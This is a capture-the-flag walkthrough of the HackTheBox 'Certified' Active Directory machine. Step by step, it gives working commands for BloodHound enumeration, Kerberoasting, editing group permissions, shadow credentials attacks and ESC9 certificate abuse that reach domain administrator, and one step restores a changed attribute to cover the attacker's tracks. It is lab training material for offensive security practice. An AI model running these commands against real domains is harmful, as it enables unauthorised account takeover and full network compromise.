---
layout: default
title: HackTheBox - Certified
parent: Writeups
nav_order: 1
---

# HackTheBox - Certified

<img src="/assets/images/writeups/certified/certified-logo.png" alt="Certified Logo" style="background: transparent; border-radius: 50%;">
## Overview

**Difficulty:** Medium  
**OS:** Windows  

[Play Certified on HackTheBox](https://app.hackthebox.com/machines/Certified?tab=play_machine)




## Initial Access - Assumed Breach

We start with compromised credentials for a domain user:
```bash
judith.mader:judith09
```
These credentials give us an initial foothold into the `certified.htb` domain.


## Enumeration

### BloodHound Collection

Often for boxes I figure to be Active Directory I won't run a port scan against them in the first instance, but instead enumerate the typical AD services and then run a port scan in the background to refer to.

We can collect the `BloodHound` data using NetExec:
```bash
# Using NetExec
nxc ldap certified.htb -u judith.mader -p judith09 --bloodhound -c all --dns-server 10.10.11.41

# Or using bloodhound-python
bloodhound-python -u 'judith.mader' -p judith09 -d certified.htb -dc DC01.CERTIFIED.HTB -ns 10.10.11.41 -c all --zip
```

Start `neo4j` and launch `BloodHound`, load your data in and have a look at the relationships, we'll come back to this.
```bash
sudo neo4j start
bloodhound
```

### Kerberoasting Attempt

Lets see if there are any service accounts we can rarget via Kerberoasting.:
```bash
impacket-GetUserSPNs 'certified.htb/judith.mader:judith09' -request
```

We get one back, copy it into a file called `hash` and attempt to crack it:
```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```

**Note:** This hash cannot be cracked, but its still worth a shot. 

## Privilege Escalation Path

### BloodHound Analysis

Going back to BloodHound, search for our controlled user `judith.mader` and mark them as owned. Under the "Node Info" tab, click the "Transitive Object Control" to reveal an interesting attack chain.

**Pro tip:** Right-click on edges in BloodHound to get help with abuse commands

The attack path shows:
- `judith.mader` has `WriteOwner` on `MANAGEMENT` group
- `MANAGEMENT` group has `GenericWrite` on `MANAGEMENT_SVC`
- `MANAGEMENT_SVC` has `GenericAll` on `CA_OPERATOR`

The `CA_OPERATOR` user appears particularly juicy, as they likely have some control over the Certificate Services.

### Step 1: Modify DACL and Add to Management Group

Since judith has `WriteOwner` on the `Management` group, we can modify the group's DACL to give ourselves `WriteMembers` permissions:
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

Now that we have `WriteMembers`, we can add `judith` to the `Management` group:
```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
```

### Step 2: Shadow Credentials Attack on management_svc

Now that judith is in the `Management` group, she inherits `GenericWrite` over the `management_svc` account. This opens up a [shadow credentials](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) attack vector.

If you haven't already installed [pywhisker](https://github.com/ShutdownRepo/pywhisker) set it up in a virtual environment:
```bash
python3 -m venv venv
source venv/bin/activate
pip3 install pywhisker
```

Now let's add a key credential to `management_svc`'s `msDS-KeyCredentialLink` attribute:
```bash
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

PFX password: `RijBTt2Ke1LwvNplSyRd`

### Step 3: Get TGT with PKINITtools

With the certificate in hand, we can use [PKINITtools](https://github.com/dirkjanm/PKINITtools) to authenticate as `management_svc`:
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools

python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/veggie/htb/certified/8DmrZnbv.pfx -pfx-pass RijBTt2Ke1LwvNplSyRd management.ccache
```

The TGT is now stored in `management.ccache`. We can use this to extract the NT hash:
```bash
KRB5CCNAME=management.ccache python3 getnthash.py certified.htb/management_svc -key c11c4280a63ed4e89532b9eb8d7a928c51919034d945d82bcc251<SNIP>
```

**NT Hash:** `a091c1832bcdd4677c28b5<SNIP>`

### Step 4: Shadow Credentials on ca_operator

Looking back at our BloodHound path, `management_svc` has `GenericAll` over `ca_operator`. This means we can perform another shadow credentials attack, but this time we'll use Certipy since it streamlines the process:
```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28<SNIP> -account ca_operator
```

**NT Hash for ca_operator:** `b4b86f45c6018f1b664f<SNIP>`

## Certificate Authority Exploitation (ESC9)

### Enumerate Certificate Templates

Now that we have control over `ca_operator`, let's enumerate the certificate templates in the environment:
```bash
certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f<SNIP> -ns 10.10.11.41
```

Search for ESC vulnerabilities:
```bash
cat 20250311060801_Certipy.txt | grep ESC
```

We found an ESC9 vulnerability in the `CertifiedAuthentication` template!

If you're not familiar with ESC9, check out [Certipy's documentation on ESC9/ESC10](https://github.com/ly4k/Certipy#esc9). The vulnerability allows us to manipulate a user's UPN attribute, request a certificate with that altered UPN, and then authenticate as a different user, specifically, a privileged one.

### Exploit ESC9

Request a certificate with the modified UPN:
```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a<SNIP> -user ca_operator -upn Administrator
```

Request certificate as `Administrator`:
```bash
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70<SNIP> -ca certified-DC01-CA -template CertifiedAuthentication
```

Restore `ca_operator`'s original UPN to cover our tracks:
```bash
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28<SNIP> -user ca_operator -upn ca_operator@certified.htb
```

## Domain Admin

We now have a certificate for the `Administrator` account. Let's authenticate with it:
```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb
```

**Administrator NT Hash:** `0d5b49608bbce1751<SNIP>`

Verify access:
```bash
nxc smb certified.htb -u administrator -H 0d5b49608bbce1751<SNIP>
```

And we're in! Full domain compromise achieved.

## Key Takeaways

By the time you've completed this box, you've demonstrated a common real-world principle of how attacks rarely rely on a single vulnerability, instead chaining together techniques do work your way up the ladder. BloodHound first helps by visualising the attack path, and using right-click context menus helps to abuse specific permisisons. Shadow credentials attacks are one of the most reliable ways to escalate when you have GenericAll or GenericWrite over accounts that support certificate authentication. Finally, the ESC9 vulnerability is interesting because it shows that even when other controls are in place, template misconfigurations can give a simple path to domain admin.
